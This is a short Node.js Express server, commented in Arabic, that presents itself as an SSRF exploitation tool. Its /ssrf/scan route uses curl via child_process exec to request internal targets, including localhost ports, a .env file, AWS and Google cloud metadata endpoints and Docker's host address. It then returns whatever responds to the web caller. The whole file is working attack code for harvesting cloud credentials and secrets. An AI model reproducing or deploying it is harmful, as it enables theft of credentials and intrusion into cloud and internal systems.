const express = require("express");
const { exec } = require("child_process");
const app = express();
const PORT = 10000;

// أهداف داخلية شائعة لاستغلال SSRF
const targets = [
  "http://127.0.0.1:80/",
  "http://127.0.0.1:8080/",
  "http://127.0.0.1:3000/",
  "http://127.0.0.1:5000/",
  "http://localhost/.env",
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/user-data/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://host.docker.internal/",
];

// دالة تفحص كل رابط
function testTarget(url, callback) {
  const cmd = `curl -s --max-time 5 "${url}"`;
  exec(cmd, (err, stdout) => {
    if (err || !stdout.trim()) {
      callback(null);
    } else {
      callback({ url, response: stdout.trim().slice(0, 500) }); // نطبع أول 500 حرف فقط
    }
  });
}

// مسار تنفيذ الفحص
app.get("/ssrf/scan", async (req, res) => {
  let found = [];

  let index = 0;

  function next() {
    if (index >= targets.length) {
      if (found.length === 0) {
        return res.send(`<h2>❌ لم يتم العثور على رد من أي هدف</h2>`);
      }
      return res.send(
        found
          .map((entry) => `<h3>🎯 ${entry.url}</h3><pre>${entry.response}</pre>`)
          .join("<hr>")
      );
    }

    const url = targets[index++];
    console.log(`📡 Trying: ${url}`);

    testTarget(url, (result) => {
      if (result) {
        console.log(`✅ SUCCESS: ${url}`);
        found.push(result);
      } else {
        console.log(`❌ FAILED: ${url}`);
      }
      next();
    });
  }

  next();
});

// تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`🔥 Server running at http://localhost:${PORT}`);
});
